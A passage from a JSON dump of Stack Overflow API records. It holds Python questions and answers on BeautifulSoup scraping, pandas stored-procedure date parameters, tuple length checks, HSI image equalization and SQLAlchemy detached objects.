noreferrer\">https://www.banggood.com/Xiaomi-Mi-Air-Laptop-2019-13_3-inch-Intel-Core-i7-8550U-8GB-RAM-512GB-PCle-SSD-Win-10-NVIDIA-GeForce-MX250-Fingerprint-Sensor-Notebook-p-1535887.html?rmmds=search&amp;cur_warehouse=CN</a></p>\n\n<p>but it seems that the \"strong\" is empty.\ni've tried few solutions but all of them gave me an empty \"strong\"\ni'm using beautifulsoup in python 3.\nfor example this code led me to an empty \"strong\":</p>\n\n<pre><code>client = requests.get(url, headers={\"User-Agent\": \"Mozilla/5.0\"})\nsoup = BeautifulSoup(client.content, 'lxml')\nfor child in soup.find(\"span\", class_=\"free_ship\").children:\n    print(child)\n</code></pre>\n"}, {"tags": ["python", "python-3.x", "pandas"], "comments": [{"owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 0, "creation_date": 1571868204, "post_id": 58531424, "comment_id": 103386866, "body": "I&#39;ve not executed a stored procedure in pandas before (although trying to figure out how to do this in databricks..), but can you try <code>pd.read_sql()</code> instead ?"}, {"owner": {"reputation": 3607, "user_id": 6043544, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/fafb6acf4f4504b54e7484bc0c17cc7a?s=128&d=identicon&r=PG&f=1", "display_name": "Serdia", "link": "https://stackoverflow.com/users/6043544/serdia"}, "reply_to_user": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 1, "creation_date": 1571868420, "post_id": 58531424, "comment_id": 103386917, "body": "Thanks. But I got the same error"}], "answers": [{"comments": [{"owner": {"reputation": 500, "user_id": 8538536, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/7KHPV.jpg?s=128&g=1", "display_name": "Suraj Motaparthy", "link": "https://stackoverflow.com/users/8538536/suraj-motaparthy"}, "edited": false, "score": 1, "creation_date": 1571869308, "post_id": 58531592, "comment_id": 103387143, "body": "What&#39;s funny is that &#39;{}&#39;.format(dt.date.today()) gives &#39;2019-10-23&#39; which is the same string notation. That&#39;s why it&#39;s a bit puzzling"}, {"owner": {"reputation": 3607, "user_id": 6043544, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/fafb6acf4f4504b54e7484bc0c17cc7a?s=128&d=identicon&r=PG&f=1", "display_name": "Serdia", "link": "https://stackoverflow.com/users/6043544/serdia"}, "edited": false, "score": 0, "creation_date": 1571869320, "post_id": 58531592, "comment_id": 103387150, "body": "With this approach it returns empty dataframe"}, {"owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "edited": false, "score": 0, "creation_date": 1571869478, "post_id": 58531592, "comment_id": 103387191, "body": "but the stored procedure executes? have you tried it in SQL to see if the values exist in the dB?"}, {"owner": {"reputation": 3607, "user_id": 6043544, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/fafb6acf4f4504b54e7484bc0c17cc7a?s=128&d=identicon&r=PG&f=1", "display_name": "Serdia", "link": "https://stackoverflow.com/users/6043544/serdia"}, "edited": false, "score": 0, "creation_date": 1571891236, "post_id": 58531592, "comment_id": 103391250, "body": "Thanks. Sorry, I switched to development environment, there is no data there. Works perfect. Thank you!"}, {"owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "reply_to_user": {"reputation": 3607, "user_id": 6043544, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/fafb6acf4f4504b54e7484bc0c17cc7a?s=128&d=identicon&r=PG&f=1", "display_name": "Serdia", "link": "https://stackoverflow.com/users/6043544/serdia"}, "edited": false, "score": 0, "creation_date": 1571904454, "post_id": 58531592, "comment_id": 103396234, "body": "@oleg interesting wonder if sql alchemy has the same behavior, thank you."}], "tags": [], "owner": {"reputation": 17765, "user_id": 9375102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/8yBw3.jpg?s=128&g=1", "display_name": "Umar.H", "link": "https://stackoverflow.com/users/9375102/umar-h"}, "is_accepted": true, "score": 1, "last_activity_date": 1571868647, "creation_date": 1571868647, "answer_id": 58531592, "question_id": 58531424, "link": "https://stackoverflow.com/questions/58531424/how-to-pass-date-parameters-to-execute-sql-stored-procedure-in-python-pandas/58531592#58531592", "title": "How to pass date parameters to execute sql stored procedure in python pandas", "body": "<p>my guess here is that SQL can't handle pandas datetime values,</p>\n\n<p>try passing the datetime values into strigns using <code>strftime</code></p>\n\n<pre><code>import datetime as dt\n\ntoday = dt.date.today()\nprev_monday = (today - dt.timedelta(days=9)).strftime('%Y-%m-%d')\nprev_sunday = (today - dt.timedelta(days=3)).strftime('%Y-%m-%d')\n\nmyparams = [prev_monday,prev_sunday, None]\nprint(myparams)\n['2019-10-14', '2019-10-20', None]\n</code></pre>\n"}], "owner": {"reputation": 3607, "user_id": 6043544, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/fafb6acf4f4504b54e7484bc0c17cc7a?s=128&d=identicon&r=PG&f=1", "display_name": "Serdia", "link": "https://stackoverflow.com/users/6043544/serdia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 641, "favorite_count": 0, "accepted_answer_id": 58531592, "answer_count": 1, "score": 1, "last_activity_date": 1571868647, "creation_date": 1571867344, "question_id": 58531424, "link": "https://stackoverflow.com/questions/58531424/how-to-pass-date-parameters-to-execute-sql-stored-procedure-in-python-pandas", "title": "How to pass date parameters to execute sql stored procedure in python pandas", "body": "<p><strong>This way works:</strong></p>\n\n<pre><code>import pandas\nimport pyodbc\nimport datetime as dt  \n\nserver = 'myserver'\ndb = 'mydb' \nmyparams = ['2017-02-01','2017-02-28', None]  # None substitutes NULL in sql\n\nconnection_string = pyodbc.connect('DRIVER={SQL Server};server='+server+';DATABASE='+ db+';Trusted_Connection=yes;')\ndf = pandas.read_sql_query('EXEC PythonTest_Align_RSrptAccountCurrentMunich @EffectiveDateFrom=?,@EffectiveDateTo=?,@ProducerLocationID=?', connection_string, params = myparams)\n</code></pre>\n\n<p><strong>But this way does not work:</strong></p>\n\n<pre><code>import datetime as dt\n\ntoday = dt.date.today()\nprev_monday = today - dt.timedelta(days=9)\nprev_sunday = today - dt.timedelta(days=3)\n\nmyparams = [prev_monday,prev_sunday, None]  # None substitutes NULL in sql\n\nconnection_string = pyodbc.connect('DRIVER={SQL Server};server='+server+';DATABASE='+ db+';Trusted_Connection=yes;')\ndf = pandas.read_sql_query('EXEC PythonTest_Align_RSrptAccountCurrentMunich @EffectiveDateFrom=?,@EffectiveDateTo=?,@ProducerLocationID=?', connection_string, params = myparams)\n</code></pre>\n\n<p><strong>Error message:</strong></p>\n\n<pre><code>    cur.execute(*args)\npandas.io.sql.DatabaseError: Execution failed on sql 'EXEC PythonTest_Align_RSrptAccountCurrentMunich @EffectiveDateFrom=?,@EffectiveDateTo=?,@ProducerLocationID=?': ('HYC00', '[HYC00] [Microsoft][ODBC SQL Server Driver]Optional feature not implemented (0) (SQLBindParameter)')\n</code></pre>\n\n<p>Is there specific way for passing date parameters in python?</p>\n"}, {"tags": ["python", "python-3.x", "function", "tuples", "maze"], "comments": [{"owner": {"reputation": 2929, "user_id": 3566606, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/B36KF.jpg?s=128&g=1", "display_name": "jonathan.scholbach", "link": "https://stackoverflow.com/users/3566606/jonathan-scholbach"}, "edited": false, "score": 0, "creation_date": 1571867303, "post_id": 58531406, "comment_id": 103386595, "body": "Sorry, from your question I cannot understand what you want to achieve."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1571867394, "post_id": 58531406, "comment_id": 103386616, "body": "You seem to be using <code>while</code> when you mean <code>if</code>."}, {"owner": {"reputation": 2929, "user_id": 3566606, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/B36KF.jpg?s=128&g=1", "display_name": "jonathan.scholbach", "link": "https://stackoverflow.com/users/3566606/jonathan-scholbach"}, "edited": false, "score": 0, "creation_date": 1571867413, "post_id": 58531406, "comment_id": 103386623, "body": "At the very first glance, at least <code>return &quot;False&quot;</code> does not make much sense and should probably be replaced by <code>return False</code>."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1571867453, "post_id": 58531406, "comment_id": 103386638, "body": "Why doesn&#39;t the <code>else:</code> block use <code>y</code>?"}, {"owner": {"reputation": 6690, "user_id": 4225229, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/2YfJM.jpg?s=128&g=1", "display_name": "JacobIRR", "link": "https://stackoverflow.com/users/4225229/jacobirr"}, "edited": false, "score": 0, "creation_date": 1571867618, "post_id": 58531406, "comment_id": 103386686, "body": "You can <code>assert len(set([len(tup) for tup in x])) == 1</code> and then do the rest of the work. Are you asking for help for the rest of the work? Or just the length check?"}, {"owner": {"reputation": 373, "user_id": 12265610, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAcynU7J15ASEboT3usZ5tw5QEmO6iCkwxs8UeJMw=k-s128", "display_name": "Martim Correia", "link": "https://stackoverflow.com/users/12265610/martim-correia"}, "edited": false, "score": 0, "creation_date": 1571868607, "post_id": 58531406, "comment_id": 103386968, "body": "the length check i just want to check if all tuples have the same size and where do i put this ```` assert len(set([len(tup) for tup in x])) == 1 ```` exactly do i replace it with any specific line?"}, {"owner": {"reputation": 6690, "user_id": 4225229, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/2YfJM.jpg?s=128&g=1", "display_name": "JacobIRR", "link": "https://stackoverflow.com/users/4225229/jacobirr"}, "edited": false, "score": 0, "creation_date": 1571876144, "post_id": 58531406, "comment_id": 103388511, "body": "@MartimCorreia you can put it at the very top if you want to raise an assertion error. If not, use the one liner from my answer below."}], "answers": [{"comments": [{"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1571867530, "post_id": 58531437, "comment_id": 103386652, "body": "There&#39;s some other condition he wants to check, not just the same length."}], "tags": [], "owner": {"reputation": 6690, "user_id": 4225229, "user_type": "registered", "accept_rate": 85, "profile_image": "https://i.stack.imgur.com/2YfJM.jpg?s=128&g=1", "display_name": "JacobIRR", "link": "https://stackoverflow.com/users/4225229/jacobirr"}, "is_accepted": false, "score": 2, "last_activity_date": 1571867451, "creation_date": 1571867451, "answer_id": 58531437, "question_id": 58531406, "link": "https://stackoverflow.com/questions/58531406/problems-with-tuples-inside-tuples/58531437#58531437", "title": "Problems with tuples inside tuples", "body": "<p>You can check this with a one-liner:</p>\n\n<pre><code>def lab(tups):\n  return len(set([len(tup) for tup in tups])) == 1\n\nprint(lab(((1,1,1),(1,0,1,1),(1,1,1)))) # False\nprint(lab(((1,1,1),(1,1,1),(1,1,1)))) # True\n</code></pre>\n\n<p>... Of course, you probably want to add error checks for empty tuples, etc</p>\n"}, {"comments": [{"owner": {"reputation": 373, "user_id": 12265610, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAcynU7J15ASEboT3usZ5tw5QEmO6iCkwxs8UeJMw=k-s128", "display_name": "Martim Correia", "link": "https://stackoverflow.com/users/12265610/martim-correia"}, "edited": false, "score": 0, "creation_date": 1571869540, "post_id": 58531544, "comment_id": 103387204, "body": "It&#39;s still not checking if the inner tuples have the same length"}, {"owner": {"reputation": 64, "user_id": 12243337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0948626561f41ac5a0601bdcd1b2e97b?s=128&d=identicon&r=PG&f=1", "display_name": "ashunt", "link": "https://stackoverflow.com/users/12243337/ashunt"}, "reply_to_user": {"reputation": 373, "user_id": 12265610, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAcynU7J15ASEboT3usZ5tw5QEmO6iCkwxs8UeJMw=k-s128", "display_name": "Martim Correia", "link": "https://stackoverflow.com/users/12265610/martim-correia"}, "edited": false, "score": 0, "creation_date": 1571873469, "post_id": 58531544, "comment_id": 103388053, "body": "that&#39;s exaclty what <code>len(t) == len(l[0])</code> is for"}], "tags": [], "owner": {"reputation": 64, "user_id": 12243337, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0948626561f41ac5a0601bdcd1b2e97b?s=128&d=identicon&r=PG&f=1", "display_name": "ashunt", "link": "https://stackoverflow.com/users/12243337/ashunt"}, "is_accepted": false, "score": 1, "last_activity_date": 1571868162, "creation_date": 1571868162, "answer_id": 58531544, "question_id": 58531406, "link": "https://stackoverflow.com/questions/58531406/problems-with-tuples-inside-tuples/58531544#58531544", "title": "Problems with tuples inside tuples", "body": "<p>If you want to check that all the inner tuples/lists have the same length:</p>\n\n<pre><code>&gt;&gt;&gt; f = lambda l: all([len(t) == len(l[0]) for t in l])\n&gt;&gt;&gt; f([(1,1,1),(1,1,1),(1,1,1)])\nTrue\n&gt;&gt;&gt; f([(1,1,1),(1,0,1,1),(1,1,1)])\nFalse\n&gt;&gt;&gt; f([])\nTrue\n</code></pre>\n"}], "owner": {"reputation": 373, "user_id": 12265610, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/a-/AAuE7mAcynU7J15ASEboT3usZ5tw5QEmO6iCkwxs8UeJMw=k-s128", "display_name": "Martim Correia", "link": "https://stackoverflow.com/users/12265610/martim-correia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 179, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1571943306, "creation_date": 1571867235, "last_edit_date": 1571943306, "question_id": 58531406, "link": "https://stackoverflow.com/questions/58531406/problems-with-tuples-inside-tuples", "title": "Problems with tuples inside tuples", "body": "<p>For a tuple of tuples I want to check that all the inner tuples have the same length.</p>\n\n<p>I've tried comparing indexes but it doesn't work.</p>\n\n<pre><code>p = ((1,1,1),(1,0,1,1),(1,1,1))\n\ndef lab(x):\n    if type(x) != tuple:\n        return False\n    else:\n        z = len(x[0])\n        for y in x:\n            if len(y) &lt; 3 and len(y[1:]) != z:\n                return False\n            else:\n                    while x[0][0] != 1:\n                        return False\n                    while x[len(x)-1][-1] != 1:\n                        return False\n        else:\n            return True\n\nprint(lab(p))\n</code></pre>\n\n<p>Basically, you can see the 2nd tuple has 4 elements and not 3 and i just wanted the function to return false and not True, since the 2nd tuple has a size different than the 1st and it should return false since that happaned. </p>\n\n<p>Im trying to build a maze and its squared and like all squares all the parts have the same size so i need all the tuples to have the same length, the first digit of the 1st tuple has to be 1 and the last digit of the last tuple to be 1 too in order to build this maze. </p>\n\n<p>Ps: I just need the length part the rest is taken care of, but if u have any ideas on how to improve this im all ears.</p>\n"}, {"tags": ["python", "image-processing"], "comments": [{"owner": {"reputation": 144849, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1571867664, "post_id": 58531390, "comment_id": 103386707, "body": "You seem to have cut out all the <code>import</code> statements and everything to do with loading and saving the image - so nobody can run it to help you."}, {"owner": {"reputation": 421, "user_id": 7625043, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-JTIFWa3sppA/AAAAAAAAAAI/AAAAAAAAALY/ow6u-0PcdwA/photo.jpg?sz=128", "display_name": "Yuriy Lisovskiy", "link": "https://stackoverflow.com/users/7625043/yuriy-lisovskiy"}, "reply_to_user": {"reputation": 144849, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1571869038, "post_id": 58531390, "comment_id": 103387067, "body": "Thanks for your comment. I&#39;ve added driver program to test the code."}, {"owner": {"reputation": 795, "user_id": 7414541, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4a0f0f802c3e07fff77fd101e86f2f16?s=128&d=identicon&r=PG&f=1", "display_name": "Yngve Moe", "link": "https://stackoverflow.com/users/7414541/yngve-moe"}, "edited": false, "score": 0, "creation_date": 1571895287, "post_id": 58531390, "comment_id": 103392371, "body": "I don&#39;t have a computer close by, but I have a couple of questions that may help you solve the problem: 1. Have you tested your equalisation with grey scale images? 2. Have you tested to see if the magnitude of <code>px - hsi2rgb_px(rgb2hsi_px(px))</code> is small?"}, {"owner": {"reputation": 421, "user_id": 7625043, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-JTIFWa3sppA/AAAAAAAAAAI/AAAAAAAAALY/ow6u-0PcdwA/photo.jpg?sz=128", "display_name": "Yuriy Lisovskiy", "link": "https://stackoverflow.com/users/7625043/yuriy-lisovskiy"}, "edited": false, "score": 0, "creation_date": 1571930766, "post_id": 58531390, "comment_id": 103410423, "body": "Thanks for your comment. Grey scale image become violet without converting it to HSI, otherwise become lighter. The magnitude of <code>px - hsi2rgb_px(rgb2hsi_px(px))</code> is 0."}, {"owner": {"reputation": 144849, "user_id": 2836621, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/suHg4.jpg?s=128&g=1", "display_name": "Mark Setchell", "link": "https://stackoverflow.com/users/2836621/mark-setchell"}, "edited": false, "score": 0, "creation_date": 1571992606, "post_id": 58531390, "comment_id": 103429469, "body": "Is this what you were aiming for? <a href=\"http://thesetchells.com/StackOverflow/58531390.png\" rel=\"nofollow noreferrer\">thesetchells.com/StackOverflow/58531390.png</a>"}, {"owner": {"reputation": 421, "user_id": 7625043, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-JTIFWa3sppA/AAAAAAAAAAI/AAAAAAAAALY/ow6u-0PcdwA/photo.jpg?sz=128", "display_name": "Yuriy Lisovskiy", "link": "https://stackoverflow.com/users/7625043/yuriy-lisovskiy"}, "edited": false, "score": 0, "creation_date": 1572083310, "post_id": 58531390, "comment_id": 103456648, "body": "Mark Setchell, yes."}], "owner": {"reputation": 421, "user_id": 7625043, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-JTIFWa3sppA/AAAAAAAAAAI/AAAAAAAAALY/ow6u-0PcdwA/photo.jpg?sz=128", "display_name": "Yuriy Lisovskiy", "link": "https://stackoverflow.com/users/7625043/yuriy-lisovskiy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 94, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1571935163, "creation_date": 1571867107, "last_edit_date": 1571935163, "question_id": 58531390, "link": "https://stackoverflow.com/questions/58531390/hsi-image-is-equalized-incorrectly-in-python", "title": "HSI image is equalized incorrectly in Python", "body": "<p>I have implemented equalization for HSI color based images. I used numpy and math modules.</p>\n\n<p>Firstly, I convert RGB image into HSI using this functions:</p>\n\n<pre><code>import math\nimport numpy as np\n\ndef rgb2hsi_px(px):\n    eps = 0.00000001\n\n    r, g, b = float(px[0]) / 255, float(px[1]) / 255, float(px[2]) / 255\n\n    # Hue component\n    numerator = 0.5 * ((r - g) + (r - b))\n    denominator = math.sqrt((r - g) ** 2 + (r - b) * (g - b))\n    theta = math.acos(numerator / (denominator + eps))\n    h = theta\n    if b &gt; g:\n        h = 2 * math.pi - h\n\n    # Saturation component\n    num = min(r, g, b)\n    den = r + g + b\n    if den == 0:\n        den = eps\n    s = 1 - 3 * num / den\n    if s == 0:\n        h = 0\n\n    # Intensity component\n    i = (r + g + b) / 3\n\n    return h, s, i\n\n\ndef rgb2hsi(image):\n    hsi_image = np.zeros_like(image).astype('float')\n    height, width, _ = image.shape\n    for x in range(height):\n        for y in range(width):\n            px = rgb2hsi_px(image[x, y])\n            hsi_image[x, y] = px\n    return np.array(hsi_image)\n</code></pre>\n\n<p>Then I equalize an intensity value of converted image. The <code>equalize</code> function was implemented using <a href=\"https://arxiv.org/pdf/1501.00108.pdf\" rel=\"nofollow noreferrer\">this article</a>:</p>\n\n<pre><code>import math\nimport numpy as np\n\ndef equalize(img):\n    eps = 0.000000000001\n    h, w, _ = img.shape\n    num_of_pxs = h * w\n    mean = 0.0\n    new_img = np.array(img)\n    while not abs(mean - 0.5) &lt; eps:\n        for i in range(h):\n            for j in range(w):\n                mean += new_img[i, j, 2]\n        mean /= num_of_pxs\n        if mean != 0.5:\n            theta = math.log(0.5, math.e) / math.log(mean, math.e)\n            for x in range(h):\n                for y in range(w):\n                    px = list(new_img[x, y])\n                    px[2] = (px[2] ** theta)\n                    new_img[x, y] = px\n    return new_img\n</code></pre>\n\n<p>After, I convert HSI image back to RGB using the next code:</p>\n\n<pre><code>import math\nimport numpy as np\n\ndef hsi2rgb_px(px):\n    h, s, i = float(px[0]), float(px[1]), float(px[2]) * 255\n    if 0 &lt;= h &lt; 2 * math.pi / 3:\n        b = i * (1 - s)\n        r = i * (1 + (s * math.cos(h)) / math.cos(math.pi / 3 - h))\n        g = 3 * i - (r + b)\n    elif 2 * math.pi / 3 &lt;= h &lt; 4 * math.pi / 3:\n        r = i * (1 - s)\n        g = i * (1 + (s * math.cos(h - 2 * math.pi / 3) / math.cos(math.pi / 3 - (h - 2 * math.pi / 3))))\n        b = 3 * i - (r + g)\n    elif 4 * math.pi / 3 &lt;= h &lt;= 2 * math.pi:\n        g = i * (1 - s)\n        b = i * (1 + (s * math.cos(h - 4 * math.pi / 3) / math.cos(math.pi / 3 - (h - 4 * math.pi / 3))))\n        r = 3 * i - (g + b)\n    else:\n        raise IndexError('h is out of range: {}'.format(h))\n    return round(r), round(g), round(b)\n\n\ndef hsi2rgb(image):\n    rgb_image = np.zeros_like(image).astype(np.uint8)\n    height, width, _ = image.shape\n    for x in range(height):\n        for y in range(width):\n            px = hsi2rgb_px(image[x, y])\n            rgb_image[x, y] = px\n    return np.array(rgb_image)\n</code></pre>\n\n<p>But an equalization gives an incorrect result. The size (in megabytes) of equalized image is larger than the original one. I'm not sure if it's normal but if yes, please, let me know. And another problem is that an output image has worse quality.</p>\n\n<p>Here is an original image:</p>\n\n<p><a href=\"https://i.stack.imgur.com/V1IOe.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/V1IOe.png\" alt=\"enter image description here\"></a></p>\n\n<p>And the equalized image:</p>\n\n<p><a href=\"https://i.stack.imgur.com/IMh09.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/IMh09.png\" alt=\"enter image description here\"></a></p>\n\n<p>Can someone help me to fix my code, or reference me to similar article/question?</p>\n\n<p>[UPDATE]</p>\n\n<p>Driver program to test an algorithm:</p>\n\n<pre><code>import matplotlib.image as mp_img\n\ninput_img = mp_img.imread('input.bmp')\n\nhsi_img = rgb2hsi(input_img)\nequalized_img = equalize(hsi_img)\nout_img = hsi2rgb(equalized_img)\n\nmp_img.imsave('out.bmp', out_img)\n</code></pre>\n"}, {"tags": ["python", "sqlalchemy"], "answers": [{"tags": [], "owner": {"reputation": 2149, "user_id": 163679, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/AWwbu.jpg?s=128&g=1", "display_name": "bigh_29", "link": "https://stackoverflow.com/users/163679/bigh-29"}, "is_accepted": true, "score": 3, "last_activity_date": 1571871203, "creation_date": 1571871203, "answer_id": 58531938, "question_id": 58531384, "link": "https://stackoverflow.com/questions/58531384/reading-attributes-of-a-detached-sqlalchemy-object-raises-detachedinstanceerror/58531938#58531938", "title": "Reading attributes of a detached sqlalchemy object raises DetachedInstanceError", "body": "<p>Dug into this more and found that I was getting bit by the default value of <code>expire_on_commit</code> being true on the session. When that is on, the <code>commit</code> call expires the object, which forced sqlalchemy to reload it the next time someone reads an attribute. If that is delayed until after session close, then the attributes can't be fetched.</p>\n\n<p>I don't really want this auto expiration, since I know my objects are in a good state and are readonly after being saved. Setting <code>expire_on_commit</code> to false in the session maker resolves the issue. </p>\n"}], "owner": {"reputation": 2149, "user_id": 163679, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/AWwbu.jpg?s=128&g=1", "display_name": "bigh_29", "link": "https://stackoverflow.com/users/163679/bigh-29"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 260, "favorite_count": 1, "accepted_answer_id": 58531938, "answer_count": 1, "score": 2, "last_activity_date": 1571871203, "creation_date": 1571867074, "question_id": 58531384, "link": "https://stackoverflow.com/questions/58531384/reading-attributes-of-a-detached-sqlalchemy-object-raises-detachedinstanceerror", "title": "Reading attributes of a detached sqlalchemy object raises DetachedInstanceError", "body": "<p>I am using short lived sqlalchemy sessions to add objects to a sqlite database. A few objects outlive the session in a readonly, detached state. Unfortunately, accessing attributes of a detached object throws an exception if the session has been closed. Here is a simplified code example</p>\n\n<pre><code>from sqlalchemy import Column, String, Integer, create_engine\nfrom sqlalchemy.ext.declarative import declarative_base\nfrom sqlalchemy.orm import sessionmaker\n\nBase = declarative_base()\n\nclass Foo(Base):\n    __tablename__ = 'foo'\n    id = Column(Integer, primary_key=True)\n    name = Column(String, nullable=False)\n\nengine = create_engine('sqlite:///foo.db', echo=False)\nBase.metadata.create_all(engine)\nSession = sessionmaker(bind=engine)\nsession = Session()\n\nf = Foo(name='foo1')\nprint('state=transient : name=', f.name)\nsession.add(f)\nprint('state=pending : name=', f.name)\nsession.commit()\nsession.close()\nprint('state=detached : name=', f.name)\n</code></pre>\n\n<pre><code># output\nstate=transient : name= foo1\nstate=pending : name= foo1\nTraceback (most recent call last):\n  File \"scratch_46.py\", line 23, in &lt;module&gt;\n    print('state=detached : name=', f.name)\n  File \"lib/python3.7/site-packages/sqlalchemy/orm/attributes.py\", line 282, in __get__\n    return self.impl.get(instance_state(instance), dict_)\n  File \"lib/python3.7/site-packages/sqlalchemy/orm/attributes.py\", line 705, in get\n    value = state._load_expired(state, passive)\n  File \"lib/python3.7/site-packages/sqlalchemy/orm/state.py\", line 660, in _load_expired\n    self.manager.deferred_scalar_loader(self, toload)\n  File \"lib/python3.7/site-packages/sqlalchemy/orm/loading.py\", line 913, in load_scalar_attributes\n    \"attribute refresh operation cannot proceed\" % (state_str(state))\nsqlalchemy.orm.exc.DetachedInstanceError: Instance &lt;Foo at 0x7f266c758ac8&gt; is not bound to a Session; attribute refresh operation cannot proceed (Background on this error at: http://sqlalche.me/e/bhk3)\n</code></pre>\n\n<p>Oddly enough, the error is not thrown if I do either of these</p>\n\n<ul>\n<li>Read the <code>name</code> attribute between the commit and close calls while the object is in the persistent state</li>\n<li>Expunge the object from the session and leave the session open. Still detached state, but I can access the attribute.</li>\n</ul>\n\n<p>Should I be able to read attributes of a detached object? Is there a way to have objects safely outlive transient sessions? I read the suggested link in the output, but it talks mostly about parent/child relationships.</p>\n\n<p>I created a <a href=\"https://github.com/sqlalchemy/sqlalchemy/issues/4941\" rel=\"nofollow noreferrer\">an issue</a> on the sqlalchemy repo because I thought this was a bug at first, but now I am not so certain.</p>\n"}, {"tags": ["python", "tuples"], "answers": [{"comments": [{"owner": {"reputation": 36931, "user_id": 225757, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/e7140b12949e4652885f6bb02b435f42?s=128&d=identicon&r=PG", "display_name": "Roland Illig", "link": "https://stackoverflow.com/users/225757/roland-illig"}, "edited": false, "score": 0, "creation_date": 1571868090, "post_id": 58531401, "comment_id": 103386835, "body": "The important part here is that the <code>return True</code> is on a different indentation level than the <code>return False</code>. When you speak out the &quot;otherwise return true&quot; in English, you cannot hear which of the possible indentation levels is meant. This may be the source of the OP&#39;s confusion."}, {"owner": {"reputation": 24576, "user_id": 3767239, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/f7cdefb47f96069d7add1222c70f3f70?s=128&d=identicon&r=PG&f=1", "display_name": "a_guest", "link": "https://stackoverflow.com/users/3767239/a-guest"}, "edited": false, "score": 0, "creation_date": 1571868866, "post_id": 58531401, "comment_id": 103387033, "body": "That basically comes down to <code>all(0 &lt;= x &lt;= 1 for x in maze)</code> (or similarly with <code>in</code>)."}], "tags": [], "owner": {"reputation": 19246, "user_id": 494134, "user_type": "registered", "accept_rate": 66, "profile_image": "https://i.stack.imgur.com/3XHKr.png?s=128&g=1", "display_name": "John Gordon", "link": "https://stackoverflow.com/users/494134/john-gordon"}, "is_accepted": false, "score": 